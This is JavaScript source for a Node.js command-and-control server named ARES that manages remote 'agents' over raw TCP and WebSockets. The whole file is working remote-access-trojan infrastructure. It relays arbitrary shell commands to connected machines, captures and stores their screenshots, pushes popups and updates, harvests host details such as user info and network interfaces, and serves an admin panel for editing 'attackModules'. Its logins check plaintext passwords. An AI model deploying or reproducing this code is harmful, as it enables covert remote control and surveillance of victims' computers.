/*
 █████╗ ██████╗ ███████╗███████╗
██╔══██╗██╔══██╗██╔════╝██╔════╝
███████║██████╔╝█████╗  ███████╗
██╔══██║██╔══██╗██╔══╝  ╚════██║
██║  ██║██║  ██║███████╗███████║
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
                                

version 1.5 8-5-19

NEED TO MAKE MORE ASYNC
*/

var net = require('net');
var uniqid = require('uniqid')
var prompt = require('prompt');
var express = require('express');
var app = express();
var http = require('http').Server(app);
var io = require('socket.io')(http);
var colors = require('colors');
const fs = require('fs');
var selectedAgent;
var wsClients = [];
var tcpClients = [];
var onlineUsers = [];
let controlClients = [];
var Nedb = require('nedb')
var dateTime = require('node-datetime');
let loginTrue;
let sub = 0;
let httpPort = 4343;
let TCPPORT = 1337;
// set this to pc ip adress 
let TCPHOST = '192.168.1.6'
//load the databases
TcpAgentList = new Nedb({ filename: 'db/TcpAgentList.db', autoload: true });
WsAgentList = new Nedb({ filename: 'db/WsAgentList.db', autoload: true });
agentCommands = new Nedb({ filename: 'db/agentCommands.db', autoload: true });
webUser = new Nedb({ filename: 'db/webUser.db', autoload: true });
//==================HANDLES CONNECTION TO MASTER SERVER====================//

var tcpServer = net.createServer().listen(TCPPORT, TCPHOST);

tcpServer.on('connection', function(sock){
  sock.id = Math.floor(Math.random()) + sock.remotePort;
  console.log('CONNECTED: ' + sock.remoteAddress + ':' + sock.remotePort);



  sock.on('close',function(data){
    console.log('closed');
  });
  sock.on('error', function(data){
    console.log('error');
  })

 sock.on('data',function(data){
   //right here i need to parse the first 'EVENT' part of the text so i can get cusotom tcp events and
   var data = Buffer.from(data).toString();
   var arg = data.split(',');
   var event = arg[0];
 //  sock.write('cmd,ipconfig');

console.log('fucking event is ' + event)

   
   if (event == 'setinfo'){
    //arg[1] = hostname
    //arg[2] = arch
    //arg[3] = platform
    //controlClients = [1,2,3,4]
    tcpClients[arg[1]] = {"socket": sock, "arch": arg[2],"platform": arg[3]};
      TcpAgentList.findOne({ agentName: arg[1]}, function(err, agent) {
        if(agent){
          console.log("TCPAGENT EXISTS UPDATING SOCK.ID TO " + sock.id);
          TcpAgentList.update({ agentName: arg[1] }, { $set: { socketId: sock.id } }, { multi: true }, function (err, numReplaced) {});
          TcpAgentList.persistence.compactDatafile();
          onlineUsers.push(arg[1]);
        }else{
        TcpAgentList.insert({agentName: arg[1],socketId: sock.id,alias: arg[1], protocol: 'raw/tcp'}, function (err) {});
        onlineUsers.push(arg[1]);
        }
      });
   }
   if(event == 'stdout'){
     console.log(controlClients)
     console.log(arg[1])
     console.log(arg[2])
     if(controlClients[arg[1]] == undefined){
       console.log('Control Client is not registered')
     }else{
      io.sockets.connected[controlClients[arg[1]].socket].emit('stdoutData', arg[2])
     }
    
     console.log(tcpClients)
     console.log(sock.id)
     TcpAgentList.findOne({ socketId:sock.id}, function(err, agent) {
      console.log(agent.alias)
      agentCommands.insert({agentName:agent.alias , agentCommand: arg[2]}, function (err) {});
     })
    }
    
    if(event == 'screenshotData'){
      agentName = arg[1]
      img = arg[2]
      console.log('agent-name ' + agentName)
      console.log('screnshotdata' + img)

      var dt = dateTime.create();
      var formattedTime = dt.format('Y-m-d-H-M-S')
      var folder = "adminPanel/screenshots/"
      var filename = formattedTime+'-'+agentName +'.png'
      console.log(filename);
      fs.writeFile(folder+filename, img, function (err) {
        console.log(err);
      });

    }

  });

  tcpServer.on('end', function(){
    console.log('left')
  })

  tcpServer.on('data',function(data){
    
  });
});
const waitFor = (ms) => new Promise(r => setTimeout(r, ms));




function checkAgentProtocol(agentName){
  var doc;
    return new Promise(resolve => {
      TcpAgentList.findOne({ agentName: agentName }, function(err,docs) {
        if(docs.protocol == 'raw/tcp'){
          resolve('tcp');
        }
        if(docs.protocol == 'websockets'){
          resolve('ws');
        }
      });
  });
}
async function asyncForEach(array, callback) {
  console.log('async function')
  for (let index = 0; index < array.length; index++) {
    await callback(array[index], index, array);
  }
}



io.on('connection', function (socket) {
  socket.emit('getInfo')
    socket.on('setInfo', function(pcName, pcPlatform, pcArch){
      wsClients[pcName] = {"socket": socket.id, "arch": pcArch,"platform": pcPlatform}
      onlineUsers.push(pcName);
      newAgent(pcName);
    })
  console.log("new connection")
  

//==================handles connection to master server====================//

//==================ADDING NEW AGENT====================//

function newAgent(pcName){
    socket.broadcast.emit('newAgent', pcName)
    WsAgentList.findOne({ agentName: pcName }, function(err, agent) {
     if(agent){
      console.log("AGENT EXISTS");
     }else{
      WsAgentList.insert({agentName: pcName, agentAlias: pcName, protocol: 'websockets'}, function (err) {});
    }
  });
}
//==================adding new agent====================//


socket.on('offline',function(pcName){
  console.log(pcName);
})

//==================SCREENSHOTS TAKING AND HANDLING====================//

socket.on('screenshotData',function(img, agentName){
  var dt = dateTime.create();
  var formattedTime = dt.format('Y-m-d-H-M-S')
  var folder = "adminPanel/screenshots/"
  var filename = formattedTime+'-'+agentName +'.png'
  console.log(filename);
  fs.writeFile(folder+filename, img, function (err) {
    console.log(err);
  });
});

socket.on('loadScreenshots',function(){
  loadScreenshots();
})
socket.on('loadAttackModules',function(){
  var path = 'adminPanel/attackModules/'
  name = "";
  getAttackModuleFiles(path, name);
  sub = 1;
})

function getAttackModuleFiles(where, name, parentFolder){
  var parentFolder = parentFolder;
  console.log('p1 '+parentFolder);
  sub++;
  var path = 'adminPanel/attackModules/';
  fs.readdir(where, (err, files) => {
    if(err){
      console.log(err);
    }
    files.forEach(name => {
      console.log(sub)
      var stats = fs.statSync(where+name);
        if(stats.isFile() == true){
          var dir = path+parentFolder+'/'+name
          socket.emit('attackModule','file',name, parentFolder, sub, dir)
        }if(stats.isDirectory() == true){
          getAttackModuleFiles(path+name+'/',name, name)
          console.log(name);
          socket.emit('attackModule','dir',name, name, sub)
         // }
        }
     });
  })
}

function loadScreenshots(){
  fs.readdir('adminPanel/screenshots', (err, files) => {
    files.forEach(file => {
      socket.emit('screenshotFileName', file)
      console.log(file)
    });
  })
}
socket.on('sendScreenshot',function(agent){
  if(onlineUsers.contains(agent) == true){
    agentCommands.insert({agentName: agent, agentCommand: 'screenshot'}, function (err) {});
    io.sockets.connected[wsClients[agent].socket].emit('screenshot')
    }else{
      console.log('error')
      socket.emit('clientOfflineError',agent)
    }
})

//==================screenshot taking and handling====================//

socket.on('selectAgent',function(agentName){
  agentCommands.find({ agentName:agentName }, function(err, docs) {
    docs.forEach(function(d) {
        data = d.agentCommand
        socket.emit('stdoutData', data)
    });
  });
})

socket.on('registerControlClient',function(uid){
  controlClients[uid] = {"socket": socket.id};
  console.log('you know what it is ' + controlClients[uid].socket);
});

socket.on('do',function(){
  console.log("okay pal")
  controlClients.forEach(function(data){
    console.log(data)
  })
})

socket.on('getAttackModuleCodeText',function(dir){
  console.log(dir);
  fs.readFile(dir, 'utf8', function(err, data) {
    if (err) throw err;
    socket.emit('attackModuleCodeText', data)
  });
})

socket.on('saveToModuleFile',function(what, data){
  fs.writeFile(what, data, function (err) {
    if (err) throw err;
    console.log('Saved! ' + data + ' to '+ what);
  });
})



socket.on('addUser',function(username, password){
  addUser(username, password)
})

socket.on('updateStat',function(data){
  socket.broadcast.emit('updateStatToWeb',data)
})

socket.on('popup',function(agent, title, content){
  if(onlineUsers.contains(agent) == true){
    var command = "popup "+title+" "+content
    agentCommands.insert({agentName: agent, agentCommand: command}, function (err) {});
    io.sockets.connected[wsClients[agent].socket].emit('popup', title, content)
    }else{
      console.log('error')
      socket.emit('clientOfflineError',agent)
    }
})

socket.on('sendUpdateCommand',function(agent){
  if(onlineUsers.contains(agent) == true){
    io.sockets.connected[wsClients[agent].socket].emit('update')
    }else{
      console.log('error')
      socket.emit('clientOfflineError',agent)
    }
})


socket.on('getAgents',function(uid, callback){
  var wsdata;
  var tcpdata
  checkUserExist(uid).then(results => {
      if (results == true) {
          WsAgentList.find({}, function(err, docs) {
              if (err) {
                  socket.emit('serverError', 'DB Error')
                  return;
              }
              wsdata = docs
          });
          TcpAgentList.find({}, function(err, docs) {
            if (err) {
                socket.emit('serverError', 'DB Error')
                return;
            }
            tcpdata = docs
            var agents = wsdata.concat(tcpdata);
            callback(agents)
        });

          
      } else {
          socket.emit('serverError', 'Invalid UID ' + uid)
      }
  }).catch(err => {
      socket.emit('serverError', 'Error processing UID ' + uid);
  });
});

socket.on('checkAgentOnline', function(uid, agentId, callback){
  checkUserExist(uid).then(results => {
    if(results == true){
      TcpAgentList.findOne({ _id: agentId }, function(err, agent) {
        if(agent){
          if(tcpClients[agent.agentName] == undefined){
            callback(false)
          }else{
            callback(true)
          }
        }else{

        }
      })
      WsAgentList.findOne({ _id: agentId }, function(err, agent) {
        if(agent){
          if(wsClients[agent.agentName] == undefined){
            callback(false)
          }else{
            callback(true)
          }
        }else{

        }
      })
    }else{
      socket.emit('serverError', 'Invalid UID ' + uid)
    }
  })
})


socket.on('getUptime',function(uid, callback){
  var uptime = process.uptime();
  //callback(formatTime(uptime))
  callback(uptime)
});





socket.on('requestAgentSettingData',function(agentName){
  if(onlineUsers.contains(agentName) == true){
  io.sockets.connected[wsClients[agentName].socket].emit('requestAgentSettingData')
  }
})
socket.on('sendAgentSettingData',function(pcName,pcArch,pcPlatform,pcFreeRam,pcHomeDir,pcHostname,pcCpuInfo,pcNICInfo,pcUserInfo){
    socket.broadcast.emit('agentSettingData',pcName,pcArch,pcPlatform,pcFreeRam,pcHomeDir,pcHostname,pcCpuInfo,pcNICInfo,pcUserInfo)
})
/*
socket.on('checkLogin',function(username, password){
  webUser.find({}, function(err, docs) {

    docs.forEach(function(d) {
        if(username == d.username && password == d.password){
          socket.emit('loginTrue', d._id)

        }if(username != d.username && password != d.password){
          socket.emit('Error')
        }
    });
  });
})*/

//Basic Auth

socket.on('checkLogin', function(username, password, callback){
  console.log(username, password)
  webUser.findOne({username:username}, function(err, docs) {
    console.log(docs)
    if(docs){
      if(docs.password == password){
        callback(docs._id)
      }else{
        callback(false)
      }
    }
    if(!docs){
      callback(false)
    }
  });
})

socket.on('checkUserExist',function(uid, callback){
  checkUserExist(uid).then(results => {
    if (results == true) {
      callback(true)
    } else {
        socket.emit('serverError', 'Invalid UID ' + uid)
        callback(false)
    }
  }).catch(err => {
    socket.emit('serverError', 'Error processing UID ' + uid);
  });
})


function checkUserExist(uid){
  console.log(uid)
    return new Promise(resolve => {
      webUser.findOne({ _id: uid }, function(err, uid) {
        if(uid){
        resolve(true)
        }if(!uid){
          resolve(false)
        }
      })
  });
}

socket.on('getUidInfo',function(uid, callback){
  checkUserExist(uid).then(results => {
    if (results == true) {
      webUser.findOne({ _id: uid }, function(err, docs) {
        callback(docs)
      })
    } else {
        socket.emit('serverError', 'Invalid UID ' + uid)
        callback(false)
    }
  }).catch(err => {
    socket.emit('serverError', 'Error processing UID ' + uid);
  });
})

function formatTime(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds);
}


function addUser(username, password){
  webUser.insert({username: username, password: password}, function (err) {});
}

socket.on('sendCmd',function(command, agent, controlClientUid){
  arg = command.split(' ');
  console.log(arg)
  preCommand = arg[0]
  command = arg[1]
  console.log('precommand ' + preCommand)
  console.log('command ' + command)
  console.log('control client uid ' + controlClientUid)
  checkUserExist(controlClientUid).then(result => {
    if(result == true){
      checkAgentProtocol(agent).then(results => {
        if(onlineUsers.contains(agent) == true){
          if(results == 'tcp'){
              if(preCommand == 'cmd'){
                tcpClients[agent].socket.write('cmd,'+ command +','+ controlClientUid)
                agentCommands.insert({agentName: agent, agentCommand: command}, function (err) {});
              }
              if(preCommand == 'screenshot\r'){
                console.log('screenshot')
                tcpClients[agent].socket.write('screenshot,'+ controlClientUid)
                agentCommands.insert({agentName: agent, agentCommand: 'screenshot Taken'}, function (err) {});
              }
          }if(results == 'ws'){
            agentCommands.insert({agentName: agent, agentCommand: command}, function (err) {});
            io.sockets.connected[wsClients[agent].socket].emit('cmd', command)
          }
        }else{
          socket.emit('clientOfflineError',agent)
        }
      })    
    }else{
      socket.emit('serverError','Invalid Uid ' + controlClientUid)
    }
  })
})


  socket.on('data', function (data, agentName) {
    socket.broadcast.emit('stdoutData', data)
    agentCommands.insert({agentName: agentName, agentCommand: data}, function (err) {});
  });
});

app.get('/', function(req, res){
  app.use(express.static(__dirname + '/adminPanel' ));
  res.sendFile(__dirname + '/adminPanel/login.html')
 // res.sendFile(__dirname + '/adminPanel/index.html')
});

app.set(httpPort, process.env.PORT || httpPort);
  http.listen(httpPort, function(){
  console.log(colors.green('[+]') + colors.white(' listening on * ' + httpPort));
});






function contains(a, obj) {
  var i = a.length;
  while (i--) {
     if (a[i] === obj) {
         return true;
     }
  }
  return false;
}
Array.prototype.contains = function(obj) {
  var i = this.length;
  while (i--) {
      if (this[i] === obj) {
          return true;
      }
  }
  return false;
}
